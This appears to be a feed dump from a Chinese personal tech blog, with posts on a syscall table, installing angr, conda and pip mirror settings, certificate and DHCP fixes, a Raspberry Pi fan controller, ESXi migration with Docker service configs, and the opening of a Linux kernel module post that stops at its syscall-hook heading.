align="center">sys_unlinkat</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">264</td><td align="center">renameat</td><td align="center">sys_renameat</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">265</td><td align="center">linkat</td><td align="center">sys_linkat</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">266</td><td align="center">symlinkat</td><td align="center">sys_symlinkat</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">267</td><td align="center">readlinkat</td><td align="center">sys_readlinkat</td><td align="center">fs&#x2F;stat.c</td></tr><tr><td align="center">268</td><td align="center">fchmodat</td><td align="center">sys_fchmodat</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">269</td><td align="center">faccessat</td><td align="center">sys_faccessat</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">270</td><td align="center">pselect6</td><td align="center">sys_pselect6</td><td align="center">fs&#x2F;select.c</td></tr><tr><td align="center">271</td><td align="center">ppoll</td><td align="center">sys_ppoll</td><td align="center">fs&#x2F;select.c</td></tr><tr><td align="center">272</td><td align="center">unshare</td><td align="center">sys_unshare</td><td align="center">kernel&#x2F;fork.c</td></tr><tr><td align="center">273</td><td align="center">set_robust_list</td><td align="center">sys_set_robust_list</td><td align="center">kernel&#x2F;futex.c</td></tr><tr><td align="center">274</td><td align="center">get_robust_list</td><td align="center">sys_get_robust_list</td><td align="center">kernel&#x2F;futex.c</td></tr><tr><td align="center">275</td><td align="center">splice</td><td align="center">sys_splice</td><td align="center">fs&#x2F;splice.c</td></tr><tr><td align="center">276</td><td align="center">tee</td><td align="center">sys_tee</td><td align="center">fs&#x2F;splice.c</td></tr><tr><td align="center">277</td><td align="center">sync_file_range</td><td align="center">sys_sync_file_range</td><td align="center">fs&#x2F;sync.c</td></tr><tr><td align="center">278</td><td align="center">vmsplice</td><td align="center">sys_vmsplice</td><td align="center">fs&#x2F;splice.c</td></tr><tr><td align="center">279</td><td align="center">move_pages</td><td align="center">sys_move_pages</td><td align="center">mm&#x2F;migrate.c</td></tr><tr><td align="center">280</td><td align="center">utimensat</td><td align="center">sys_utimensat</td><td align="center">fs&#x2F;utimes.c</td></tr><tr><td align="center">281</td><td align="center">epoll_pwait</td><td align="center">sys_epoll_pwait</td><td align="center">fs&#x2F;eventpoll.c</td></tr><tr><td align="center">282</td><td align="center">signalfd</td><td align="center">sys_signalfd</td><td align="center">fs&#x2F;signalfd.c</td></tr><tr><td align="center">283</td><td align="center">timerfd_create</td><td align="center">sys_timerfd_create</td><td align="center">fs&#x2F;timerfd.c</td></tr><tr><td align="center">284</td><td align="center">eventfd</td><td align="center">sys_eventfd</td><td align="center">fs&#x2F;eventfd.c</td></tr><tr><td align="center">285</td><td align="center">fallocate</td><td align="center">sys_fallocate</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">286</td><td align="center">timerfd_settime</td><td align="center">sys_timerfd_settime</td><td align="center">fs&#x2F;timerfd.c</td></tr><tr><td align="center">287</td><td align="center">timerfd_gettime</td><td align="center">sys_timerfd_gettime</td><td align="center">fs&#x2F;timerfd.c</td></tr><tr><td align="center">288</td><td align="center">accept4</td><td align="center">sys_accept4</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">289</td><td align="center">signalfd4</td><td align="center">sys_signalfd4</td><td align="center">fs&#x2F;signalfd.c</td></tr><tr><td align="center">290</td><td align="center">eventfd2</td><td align="center">sys_eventfd2</td><td align="center">fs&#x2F;eventfd.c</td></tr><tr><td align="center">291</td><td align="center">epoll_create1</td><td align="center">sys_epoll_create1</td><td align="center">fs&#x2F;eventpoll.c</td></tr><tr><td align="center">292</td><td align="center">dup3</td><td align="center">sys_dup3</td><td align="center">fs&#x2F;file.c</td></tr><tr><td align="center">293</td><td align="center">pipe2</td><td align="center">sys_pipe2</td><td align="center">fs&#x2F;pipe.c</td></tr><tr><td align="center">294</td><td align="center">inotify_init1</td><td align="center">sys_inotify_init1</td><td align="center">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c</td></tr><tr><td align="center">295</td><td align="center">preadv</td><td align="center">sys_preadv</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">296</td><td align="center">pwritev</td><td align="center">sys_pwritev</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">297</td><td align="center">rt_tgsigqueueinfo</td><td align="center">sys_rt_tgsigqueueinfo</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">298</td><td align="center">perf_event_open</td><td align="center">sys_perf_event_open</td><td align="center">kernel&#x2F;events&#x2F;core.c</td></tr><tr><td align="center">299</td><td align="center">recvmmsg</td><td align="center">sys_recvmmsg</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">300</td><td align="center">fanotify_init</td><td align="center">sys_fanotify_init</td><td align="center">fs&#x2F;notify&#x2F;fanotify&#x2F;fanotify_user.c</td></tr><tr><td align="center">301</td><td align="center">fanotify_mark</td><td align="center">sys_fanotify_mark</td><td align="center">fs&#x2F;notify&#x2F;fanotify&#x2F;fanotify_user.c</td></tr><tr><td align="center">302</td><td align="center">prlimit64</td><td align="center">sys_prlimit64</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">303</td><td align="center">name_to_handle_at</td><td align="center">sys_name_to_handle_at</td><td align="center">fs&#x2F;fhandle.c</td></tr><tr><td align="center">304</td><td align="center">open_by_handle_at</td><td align="center">sys_open_by_handle_at</td><td align="center">fs&#x2F;fhandle.c</td></tr><tr><td align="center">305</td><td align="center">clock_adjtime</td><td align="center">sys_clock_adjtime</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">306</td><td align="center">syncfs</td><td align="center">sys_syncfs</td><td align="center">fs&#x2F;sync.c</td></tr><tr><td align="center">307</td><td align="center">sendmmsg</td><td align="center">sys_sendmmsg</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">308</td><td align="center">setns</td><td align="center">sys_setns</td><td align="center">kernel&#x2F;nsproxy.c</td></tr><tr><td align="center">309</td><td align="center">getcpu</td><td align="center">sys_getcpu</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">310</td><td align="center">process_vm_readv</td><td align="center">sys_process_vm_readv</td><td align="center">mm&#x2F;process_vm_access.c</td></tr><tr><td align="center">311</td><td align="center">process_vm_writev</td><td align="center">sys_process_vm_writev</td><td align="center">mm&#x2F;process_vm_access.c</td></tr><tr><td align="center">312</td><td align="center">kcmp</td><td align="center">sys_kcmp</td><td align="center">kernel&#x2F;kcmp.c</td></tr><tr><td align="center">313</td><td align="center">finit_module</td><td align="center">sys_finit_module</td><td align="center">kernel&#x2F;module.c</td></tr></tbody></table><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><p><a href="http://shell-storm.org/shellcode/files/syscalls.html">http://shell-storm.org/shellcode/files/syscalls.html</a></p>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3关于angr的安装</title>
      <link href="/2020/10/26/python3-guan-yu-angr-de-an-zhuang/"/>
      <url>/2020/10/26/python3-guan-yu-angr-de-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在debian10.6上安装angr</p><ul><li>python&#x3D;3.7</li><li>debian&#x3D;10.6</li></ul><h1 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><pre><code class="bash">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapperexport WORKON_HOME=$HOME/angrsource /usr/share/virtualenvwrapper/virtualenvwrapper.sh</code></pre><h2 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h2><p>国内提前换好pip源</p><pre><code class="bash">mkvirtualenv --python=$(which python3) angrpip install angr</code></pre><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="进入环境"><a href="#进入环境" class="headerlink" title="进入环境"></a>进入环境</h2><pre><code class="bash">export WORKON_HOME=$HOME/angrsource /usr/share/virtualenvwrapper/virtualenvwrapper.shworkon angr</code></pre><h2 id="退出环境"><a href="#退出环境" class="headerlink" title="退出环境"></a>退出环境</h2><pre><code class="bash">deactivate</code></pre><h1 id="windows-上面"><a href="#windows-上面" class="headerlink" title="windows 上面"></a>windows 上面</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="bash">conda create -n angr python=3.7conda activate angrpython -m pip install angr</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angr </tag>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python环境的便利操作</title>
      <link href="/2020/10/19/guan-yu-python-huan-jing-de-bian-li-cao-zuo/"/>
      <url>/2020/10/19/guan-yu-python-huan-jing-de-bian-li-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>关于linux下python环境还是conda使用的方便，所以对于conda进行一个常用的配置</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="conda源"><a href="#conda源" class="headerlink" title="conda源"></a>conda源</h2><pre><code class="bash">cat &gt; ~/.condarc &lt;&lt; EOFchannels:  - defaultsshow_channel_urls: truechannel_alias: https://mirrors.tuna.tsinghua.edu.cn/anacondadefault_channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2custom_channels:  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloudEOFconda clean -i</code></pre><h2 id="更新：直接上代理更稳定"><a href="#更新：直接上代理更稳定" class="headerlink" title="更新：直接上代理更稳定"></a>更新：直接上代理更稳定</h2><pre><code class="bash">cat &gt; ~/.condarc &lt;&lt; EOFshow_channel_urls: trueproxy_servers:  http: http://proxy.dopwn.cn:8080  https: http://proxy.dopwn.cn:8080ssl_verify: falseEOF</code></pre><h3 id="windows-conda源"><a href="#windows-conda源" class="headerlink" title="windows conda源"></a>windows conda源</h3><pre><code class="bash">conda config --set show_channel_urls yes</code></pre><p>然后修改～&#x2F;.condarc</p><h2 id="conda-zshrc"><a href="#conda-zshrc" class="headerlink" title="conda zshrc"></a>conda zshrc</h2><pre><code class="bash">cat &gt;&gt; ~/.zshrc &lt;&lt; EOF# &gt;&gt;&gt; conda initialize &gt;&gt;&gt;# !! Contents within this block are managed by &#39;conda init&#39; !!__conda_setup=&quot;$(&#39;/root/miniconda3/bin/conda&#39; &#39;shell.bash&#39; &#39;hook&#39; 2&gt; /dev/null)&quot;if [ $? -eq 0 ]; then    eval &quot;$__conda_setup&quot;else    if [ -f &quot;/root/miniconda3/etc/profile.d/conda.sh&quot; ]; then        . &quot;/root/miniconda3/etc/profile.d/conda.sh&quot;    else        export PATH=&quot;/root/miniconda3/bin:$PATH&quot;    fifiunset __conda_setup# &lt;&lt;&lt; conda initialize &lt;&lt;&lt;EOFsource ~/.zshrc</code></pre><h2 id="pip源"><a href="#pip源" class="headerlink" title="pip源"></a>pip源</h2><pre><code class="bash">mkdir ~/.pipcat &gt; ~/.pip/pip.conf &lt;&lt; EOF[global]index-url = https://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.comEOF</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
          <category> devops </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> conda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>safari关于不安全链接的解决办法</title>
      <link href="/2020/10/17/safari-guan-yu-bu-an-quan-lian-jie-de-jie-jue-ban-fa/"/>
      <url>/2020/10/17/safari-guan-yu-bu-an-quan-lian-jie-de-jie-jue-ban-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>换了vsphere和esxi后，系统证书需要重新生效，发现chrome很好搞定vsphere，能用不安全的链接登陆esxi。safari是可以登陆vsphere不能打开esxi。这里记录了修复的过程</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ol><li>首先在keyschains里面清除之前的vsphere和esxi的证书</li><li>导入vsphere的证书并且标记为始终信任，重启浏览器，发现chrome和safari都可以安全方式打开vsphere即可</li><li>打开safari，在偏好设置点击隐私-&gt;管理网站数据，搜索esxi相关信息，将搜索到的内容移除即可</li><li>在safari里面利用ip打开esxi，这里我使用域名还是显示不安全连接，ip则可以，然后同意</li><li>在keyschains里面把esxi的证书标记为始终信任</li><li>重复第四步，然后打开esxi发现也是安全链接了。</li></ol><p>over</p><h2 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h2><p>关于windows导入证书</p><p><code>win+r</code> -&gt; <code>mmc</code> -&gt; <code>添加/删除管理单元</code> -&gt; <code>证书</code> -&gt; <code>受信任的根证书颁发机构</code> </p><p>删除原来的导入新的vsphere证书，发现esxi和vsphere都可以用了</p>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> safari </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debian10关于dhcp renew失败的修复</title>
      <link href="/2020/10/10/debian10-guan-yu-dhcp-renew-shi-bai-de-xiu-fu/"/>
      <url>/2020/10/10/debian10-guan-yu-dhcp-renew-shi-bai-de-xiu-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>更换了新的宿主机之后，发现debian的dhcp 在renew的环节中会出现问题<br>以下是修复方案</p><h2 id="dhclient进程"><a href="#dhclient进程" class="headerlink" title="dhclient进程"></a>dhclient进程</h2><p>系统的dhclient进程命令为</p><pre><code class="bash">/sbin/dhclient -4 -v -i -pf /run/dhclient.ens192.pid -lf /var/lib/dhcp/dhclient.ens192.leases -I -df /var/lib/dhcp/dhclient6.ens192.leases ens192</code></pre><p>会出现可以接受发送renew的相关包，就是没用</p><p>而自己使用</p><pre><code class="bash">/sbin/dhclient ens192</code></pre><p>则可以正确的续约</p><h2 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h2><p>加入系统开机任务项即可</p><p><code>vim /lib/systemd/system/rc.local.service</code>编辑这个文件</p><pre><code class="bash">#  SPDX-License-Identifier: LGPL-2.1+##  This file is part of systemd.##  systemd is free software; you can redistribute it and/or modify it#  under the terms of the GNU Lesser General Public License as published by#  the Free Software Foundation; either version 2.1 of the License, or#  (at your option) any later version.# This unit gets pulled automatically into multi-user.target by# systemd-rc-local-generator if /etc/rc.local is executable.[Unit]Description=/etc/rc.local CompatibilityDocumentation=man:systemd-rc-local-generator(8)ConditionFileIsExecutable=/etc/rc.localAfter=network.target[Service]Type=forkingExecStart=/etc/rc.localTimeoutSec=0RemainAfterExit=yesGuessMainPID=no[Install]WantedBy=multi-user.target</code></pre><p><code>vim /etc/rc.local</code><br>写入以下内容</p><pre><code class="bash">#!/bin/sh -e## rc.local## This script is executed at the end of each multiuser runlevel.# Make sure that the script will &quot;exit 0&quot; on success or any other# value on error.## In order to enable or disable this script just change the execution# bits.## By default this script does nothing./sbin/dhclient ens192exit 0</code></pre><p>开机启动</p><pre><code class="bash">systemctl daemon-reload &amp;&amp; systemctl enable rc-local.service</code></pre><p>结果失败离场</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>错错错！！！</p><p>安装的时候选用时区为china<br>的确是这样<br><code>cat /var/lib/dhcp/dhclient.leases</code><br>发现用的时间是utc<br>而我把timezone改成了本地时区<br>猜测是开机后用的还是utc，没有读这个，而后来的就使用的是用户的时区了。</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>发现是vmtools的锅，只要安装了vmtools，dhclient就不能开机正常，所以就不安装vmtools吧，先狗着</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>今天突然发现一台centos8.2也出现了这问题，就想到了可能是我的主机设置上出了什么问题<br>发现是esxi在设置时区的时候我设置成了Asia&#x2F;china<br>把esxi vsphere全部改成UTC然后ntp同步一下就完事了</p><p>查了下资料，</p>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Debian10 </tag>
            
            <tag> Esxi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派自控风扇</title>
      <link href="/2020/09/29/shu-mei-pai-zi-kong-feng-shan/"/>
      <url>/2020/09/29/shu-mei-pai-zi-kong-feng-shan/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>树莓派4b的自控风扇</p><h2 id="主要信息"><a href="#主要信息" class="headerlink" title="主要信息"></a>主要信息</h2><p>系统: Debian-Pi-Aarch64 2020-06-22-v2020-2.0-U4-Release BaseOS Plus++<br>三极管：S8050 NPN<br>连接线：杜邦线公对母，母对母</p><h2 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h2><p>风扇正极-&gt;5V<br>风扇负极-&gt;S8050 C<br>S8050-B-&gt; Pi Pin12<br>S8050-E-&gt; Pi GND</p><h2 id="安装相应包"><a href="#安装相应包" class="headerlink" title="安装相应包"></a>安装相应包</h2><pre><code class="bash">sudo apt-get install python-pip python-devpip install RPi.GPIO spidev</code></pre><h2 id="控制程序"><a href="#控制程序" class="headerlink" title="控制程序"></a>控制程序</h2><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import RPi.GPIO as GPIOimport timeGPIO.setwarnings(False)GPIO.setmode(GPIO.BOARD)GPIO.setup(12, GPIO.OUT)pwm = GPIO.PWM(12, 100)GPIO.setwarnings(False)speed = 0now_temp = 0pwm.start(100)logfile=open(&#39;/tmp/auto_temp.log&#39;,&#39;a&#39;)def get_temp():    tmpFile = open( &#39;/sys/class/thermal/thermal_zone0/temp&#39;)    temp=float(tmpFile.read())/1000    tmpFile.close()    return tempwhile True:    now_temp=get_temp()    logfile.write(time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time()))+&quot;   now_temp: &quot;+str(now_temp)+&quot;  speed:&quot;)    if now_temp&gt;=34:        speed=min(int(now_temp-34)*5,100)        logfile.write(str(speed)+&#39;\n&#39;)        logfile.flush()        pwm.ChangeDutyCycle(speed)    time.sleep(5)</code></pre><h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><p><code>/etc/systemd/system/auto_temp.service</code></p><pre><code class="bash">[Unit]Description=Auto temp ServiceAfter=network.target[Service]Type=simpleUser=piExecStart=python /home/pi/auto_temp.pyRestart=on-failureSuccessExitStatus=3 4RestartForceExitStatus=3 4[Install]WantedBy=multi-user.target</code></pre><pre><code class="bash">systemctl daemon-reloadsystemctl enable auto_tempsystemctl start auto_temp</code></pre>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Raspberrypi </tag>
            
            <tag> Fans </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>esxi迁移虚拟机</title>
      <link href="/2020/09/28/esxi-qian-yi-xu-ni-ji/"/>
      <url>/2020/09/28/esxi-qian-yi-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>原来的esxi进行淘汰处理，需要将里面数据迁移出来，等新的服务器到了迁移过去<br>esxi: 12<em>2t raid6<br>备份机器: 7t hdd<br>新esxi：8</em>2t raid6</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>先发现资源池和vm</p><pre><code class="bash">ovftool vi://root:&#123;password&#125;@&#123;ip&#125;/&#123;ResourcePool&#125;</code></pre><p>如果是虚拟机模版，就需要使用vsphere的来进行下载了</p><h2 id="进行虚拟机备份"><a href="#进行虚拟机备份" class="headerlink" title="进行虚拟机备份"></a>进行虚拟机备份</h2><p>把ovftool添加到环境变量后，windows下后面的用<code>\</code></p><pre><code class="bash">ovftool vi://root:&#123;password&#125;@&#123;ip&#125;/&#123;ResourcePool&#125;/&#123;name&#125; .\&#123;name&#125;</code></pre><h2 id="进行部分应用备份"><a href="#进行部分应用备份" class="headerlink" title="进行部分应用备份"></a>进行部分应用备份</h2><h3 id="nextcloud"><a href="#nextcloud" class="headerlink" title="nextcloud"></a>nextcloud</h3><p>把两个目录打包就ok了<br>把端口和数据库密码改成自己的<br>docker-compose.yaml</p><pre><code class="yaml">version: &#39;3&#39;services:  db:    image: mariadb    command: --transaction-isolation=READ-COMMITTED --binlog-format=ROW    #command: --innodb-force-recovery=2    #--transaction-isolation=READ-COMMITTED --binlog-format=ROW --log-bin    restart: always    volumes:      - /data/nextcloud_db:/var/lib/mysql    environment:      - MYSQL_ROOT_PASSWORD=password    env_file:      - db.env  redis:    image: redis:alpine    restart: always  app:    image: nextcloud:apache    restart: always    ports:      - 80:80    volumes:      - /data/nextcloud:/var/www/html    environment:      - MYSQL_HOST=db      - REDIS_HOST=redis      - TZ=Asia/Shanghai      - UID=1000      - GID=1000      - UPLOAD_MAX_SIZE=10G      - APC_SHM_SIZE=128M      - OPCACHE_MEM_SIZE=128      - CRON_PERIOD=15m    env_file:      - db.env    depends_on:      - db      - redis  cron:    image: nextcloud:apache    restart: always    volumes:      - /data/nextcloud:/var/www/html    entrypoint: /cron.sh    depends_on:      - db      - redis</code></pre><p>db.env</p><pre><code class="bash">MYSQL_PASSWORD=passwordMYSQL_DATABASE=nextcloudMYSQL_USER=nextcloud</code></pre><p>迁移后，记得用原来的版本的docker先运行起来，跨版本容易出问题，<br>然后</p><pre><code class="bash">chown -R www-data:www-data ./nextcloudchown -R systemd-coredump:systemd-coredump ./nextcloud_db</code></pre><h3 id="gitlab"><a href="#gitlab" class="headerlink" title="gitlab"></a>gitlab</h3><p>删了容器后把config、logs、data三个文件夹打包就行<br>start.sh</p><pre><code class="bash">docker run -d  -p 443:443 -p 80:80 -p 22:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:rc</code></pre><p>恢复文件时候<code>chmod -R 777 ./</code><br>gitlab会自动修复文件权限</p><p>然而对于sshkey文件不会修复，手动一下</p><pre><code class="bash">chmod 600 /etc/gitlab/ssh_host_*docker restart gitlab</code></pre><p>搞定</p><h3 id="gogs"><a href="#gogs" class="headerlink" title="gogs"></a>gogs</h3><p>gogs因为制作的时候比优化性能，所以有点麻烦<br>其实可以打包这个目录，<br>对于下面的文件，修改mysql_password，domain_name,SECRET_KEY</p><pre><code class="yaml">version: &#39;3.6&#39;services:  app:    image: $&#123;DOCKER_GOGS_IMAGE&#125;    restart: always    networks:      - traefik      - gogs    expose:      - 80    ports:      - &quot;22:22&quot;      - &quot;80:80&quot;    links:      - db:$&#123;MYSQL_HOST&#125;      - cache:$&#123;REDIS_HOST&#125;    depends_on:      - db      - cache    labels:      - &quot;traefik.enable=true&quot;      - &quot;traefik.port=80&quot;      - &quot;traefik.frontend.rule=Host:$&#123;GOGS_DOMIAN&#125;&quot;      - &quot;traefik.frontend.entryPoints=http,https&quot;      - &quot;traefik.frontend.headers.SSLRedirect=true&quot;      - &quot;traefik.frontend.headers.SSLProxyHeaders=X-Forwarded-Proto:https&quot;      - &quot;traefik.frontend.headers.STSSeconds=315360000&quot;      - &quot;traefik.frontend.headers.frameDeny=true&quot;      - &quot;traefik.docker.network=traefik&quot;    logging:      driver: &quot;json-file&quot;      options:        max-size: &quot;10m&quot;    extra_hosts:      - &quot;$&#123;GOGS_DOMIAN&#125;:127.0.0.1&quot;    volumes:      # 标准 Linux 系统下使用      # - /etc/localtime:/etc/localtime:ro      # - /etc/timezone:/etc/timezone:ro      - ./app.ini:/data/gogs/conf/app.ini:ro      - ./logs:/data/gogs/data/log      - ./data/avatars:/data/gogs/data/avatars      - ./data/ssh:/data/ssh      - ./data/git:/data/git      # 根据自己需求使用      # - ./data/custom/template/head.tmpl:/app/gogs/templates/inject/head.tmpl      # - ./data/custom/template/footer.tmpl:/app/gogs/templates/inject/footer.tmpl      # - ./data/custom/inject-assets/:/app/gogs/public/inject-assets/    healthcheck:      test: [&quot;CMD-SHELL&quot;, &quot;wget -q --spider --proxy off localhost:80 || exit 1&quot;]      interval: 5s  db:    image: $&#123;DOCKE_MYSQL_IMAGE&#125;    restart: always    networks:      - gogs    expose:      - 3306    command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci    environment:      MYSQL_ROOT_PASSWORD: gogs      MYSQL_DATABASE: gogs      MYSQL_USER: gogs      MYSQL_PASSWORD: &#123;password&#125;      TZ: Asia/Shanghai    volumes:      # 标准 Linux 系统下使用      # - /etc/localtime:/etc/localtime:ro      # - /etc/timezone:/etc/timezone:ro      - ./mysql:/var/lib/mysql    healthcheck:      test: [&quot;CMD-SHELL&quot;, &quot;/etc/init.d/mysql status&quot;]      interval: 30s  cache:    image: $&#123;DOCKER_REDIS_IMAGE&#125;    restart: always    networks:      - gogs    expose:      - 6379    healthcheck:      test: [&quot;CMD&quot;, &quot;redis-cli&quot;, &quot;ping&quot;]    environment:      TZ: Asia/Shanghai    # volumes:      # 标准 Linux 系统下使用      # - /etc/localtime:/etc/localtime:ro      # - /etc/timezone:/etc/timezone:ronetworks:  gogs:    internal: true  traefik:    external: true</code></pre><p>app.ini</p><pre><code class="bash">APP_NAME = Private RepoRUN_USER = gitRUN_MODE = prod[database]DB_TYPE  = mysqlHOST     = mysql.gogs.&#123;domain_name&#125;:3306NAME     = gogsUSER     = gogsPASSWD   = &#123;password&#125;SSL_MODE = disablePATH     = data/gogs.db[cache]ADAPTER=redisINTERVAL=60HOST=network=tcp,addr=cache.gogs.&#123;domain_name&#125;:6379,password=,db=0,pool_size=100,idle_timeout=180[repository]ROOT = /data/git/gogs-repositoriesFORCE_PRIVATE=trueMAX_CREATION_LIMIT=-1DISABLE_HTTP_GIT=true[server]DOMAIN           = gogs.&#123;domain_name&#125;HTTP_PORT        = 80ROOT_URL         = https://gogs.&#123;domain_name&#125;/DISABLE_SSH      = falseSSH_PORT         = 22SSH_LISTEN_HOST  = 0.0.0.0SSH_LISTEN_PORT  = 22START_SSH_SERVER = tureOFFLINE_MODE     = true[mailer]ENABLED = false[service]REGISTER_EMAIL_CONFIRM = falseENABLE_NOTIFY_MAIL     = falseDISABLE_REGISTRATION   = trueENABLE_CAPTCHA         = falseREQUIRE_SIGNIN_VIEW    = true[picture]DISABLE_GRAVATAR        = trueENABLE_FEDERATED_AVATAR = false[session]PROVIDER=redisPROVIDER_CONFIG=network=tcp,addr=cache.gogs.&#123;domain_name&#125;:6379,password=,db=0,pool_size=100,idle_timeout=180[log]MODE      = console, fileLEVEL     = InfoROOT_PATH = /app/gogs/log[admin]DISABLE_REGULAR_ORG_CREATION=true[security]INSTALL_LOCK = trueLOGIN_REMEMBER_DAYS=trueSECRET_KEY   = &#123;SECRET_KEY&#125;[other]SHOW_FOOTER_BRANDING=false</code></pre>]]></content>
      
      
      <categories>
          
          <category> virtualization </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Esxi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux kernel hook</title>
      <link href="/2020/09/14/linux-kernel-hook/"/>
      <url>/2020/09/14/linux-kernel-hook/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>好久都没搞linux的kernel了，记录一下</p><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code class="bash">CONFIG_MODULE_SIG=nobj-m += hook_test.oall:    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre><p><code>CONFIG_MODULE_SIG=n</code>是针对<code>module verification failed: signature and/or required key missing - tainting kernel</code>的最简单方法，或者直接进行签名</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li>插入模块 <code>insmod</code></li><li>查看模块 <code>lsmod</code></li><li>查看信息 <code>dmesg</code></li><li>卸载模块 <code>rmmod</code></li><li>载入模块 <code>modprobe -a</code></li></ul><h3 id="对于printk直接输出到termianl"><a href="#对于printk直接输出到termianl" class="headerlink" title="对于printk直接输出到termianl"></a>对于<code>printk</code>直接输出到termianl</h3><pre><code class="bash">dmesg -wH &amp;</code></pre><p>然后运行模块</p><h3 id="对于指定等级的输出"><a href="#对于指定等级的输出" class="headerlink" title="对于指定等级的输出"></a>对于指定等级的输出</h3><pre><code class="bash">dmesg -wH | grep ERR &amp;在内核源码中使用printk(KERN_EMERG &quot;ERROR!\n&quot;);</code></pre><h2 id="对于syscall的hook"><a 